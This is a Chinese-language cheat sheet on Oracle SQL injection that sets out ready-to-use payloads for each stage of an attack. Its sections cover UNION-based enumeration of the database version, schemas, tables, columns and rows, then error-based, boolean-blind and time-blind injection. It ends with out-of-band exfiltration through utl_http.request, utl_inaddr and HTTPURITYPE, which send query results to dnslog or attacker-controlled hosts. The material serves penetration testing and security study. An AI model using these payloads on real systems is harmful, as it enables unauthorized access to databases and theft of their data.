# Oracle SQL注入

## 登录Oracle数据库

- sqlplus命令行
- navicat for oracle

## Oracle注释

- --单行注释
- /**/多行注释

## union联合

**oracle强匹配类型：查询的数据类型和字段类型必须一致**

```
?id=1 union select null,null,null from dual--
```

基本流程

1. 判断注入

2. 判断数据库是否为oracle

   ```
   and exists(select * from dual)--
   ```

3. 判断字段数

   ```
   order by 4--
   ```

4. 查询数据库相关信息

   ```
   ?id=1 union select null,(select banner from sys.v_$version where rownum=1),null,null from dual--  #查询数据库版本信息
   ?id=1 union select null,(select SYS_CONTEXT ('USERENV','CURRENT_USER') from dual),null,null from dual--  #获取数据库连接数据名
   ?id=1 union select null,(select instance_name from v$instance),null,null from dual--  #获取当前数据库实例名
   ```

5. 查询库名

   ```
   ?id=1 union select 1,(select owner from all_tables where rownum=1 and owner not in(select owner from all_tables where rownum=1)),null,null from dual--
   ?id=1 union select null,(select distinct owner from all_tables where rownum=1 and owner<>'SYS'and owner<>'OUTLN' and owner<>'SYSTEM'),null,null from dual--
   ```

6. 查询表名

   ```
   ?id=1 union select 1,(select table_name from user_tables where rownum=1),null,null from dual--
   ?id=1 union select 1,(select table_name from user_tables where rownum=1 and table_name<>'DEMO' and table_name<>'FLAG'),null,null from dual--
   ```

7. 查询字段名

   ```
   ?id=1 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='DEMO'),null,null from dual--
   ?id=1 union select 1,(select column_name from user_tab_columns where rownum=1 and table_name='DEMO' and column_name<>'ID' and column_name<>'NAME'),null,null from dual--
   ```

8. 查询数据

   ```
   ?id=1 union select 1,(select ID||NAME||AGE from DEMO where rownum=1),null,null from dual--
   ?id=1 union select 1,(select ID||NAME||AGE from DEMO where rownum=1 and NAME<>'zhangshan'),null,null from dual--
   ?id=1 union select 1,(select concat(NAME,AGE) from DEMO where rownum=1),null,null from dual--
   ```

   > PS：连接多个字段使用连接符号II,在oracle数据库中，concat函数只能连接两个字符串

## 报错注入

相关函数

- dbms_xdb_version.checkin()

  ```
  ?id=1 and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null
  ```

- dbms_xdb_version.uncheckout()

  ```
  ?id=1 and (select dbms_xdb_version.uncheckout((select user from dual))from dual) is not null
  ```

- utl_inaddr.get_host_name()

  > 说明：这种方法在Oracle 8g,9g,10g中不需要任何权限。11g以后的版本要使用此方法进行报错注入，则当前数据库用户必须有网络访问权限。
  > 报错方法：获取ip地址，其参数如果解析不了会报错，显示传递的参数

  ```
  ?id=1 and utl_inaddr.get_host_name((select user from dual))=1--
  ```

- 其他报错函数

  ![image-20220920150442786](https://oos.luoyunhao.com/blog-img/202209201504884.png)

## 布尔盲注

- decode()

  ```
  ?id=1 and 1=(select decode(substr((select owner from all_tables where rownum=1),1,1),'S',1,0) from dual)--  #截取第一个字符，是S则返回1
  ```

- instr()

  搜索指定字符串，存在则返回在查询结果中的位置

  ```
  ?id=1 and 1=(instr((select owner from all_tables where rownum=1),'T'))--  #判断第一个字符是否为T
  ```

- 利用ascii和substr判断

  ```
  ?id=1 and ascii(substr((select table_name from user_tables where rownum=1),1,1))=68--
  ```

## 时间盲注

- dbms_pipe.receive_message

  ```
  ?id=1 and dbms_pipe.receive_message('ICQ',5)=1-- #接收ICQ并等待5s
  ```

  配合decode()

  ```
  ?id=1 and 1=(select decode(substr((select owner from all_tables where rownum=1),1,1),'S',dbms_pipe.receive_message('ICQ',5),0) from dual)--  #截取第一个字符，是S则延时5s
  ```

## 数据外带

- utl_http.request()

  该函数用于发起http请求（可以利用该函数进行DNS或HTTP数据外带）

  ```
  ?id=1 and utl_http.request('http://'||(select user from dual)||'.xxx.dnslog.cn')=1--
  ?id=1 and utl_http.request('http://'||(select owner from all_tables where rownum=1)||'.vhlavh.dnslog.cn')=1--
  ?id=1 and utl_http.request('http://xxx/'||(select user from dual))=1--
  ```

  > 判断该函数是否可用
  >
  > ```
  > ?id=1 and exists(select count(*) from all_objects where object_name='UTL_HTTP')--  #回显正常则说明可用
  > ```

- utl_inaddr.get_host_address()

  从域名转换成IP地址，发起DNS查询请求

  ```
  ?id=1 and utl_inaddr.get_host_address((select user from dual)||'.xxx.dnslog.cn')=1-- #测试时无用
  ```

- HTTPURITYPE

  HTTP数据外带

  ```
  ?id=1 and (select HTTPURITYPE('http://x.x.x.x:9090/'||(select
  user from dual)).GETCLOB() from dual)is not null--
  ```

  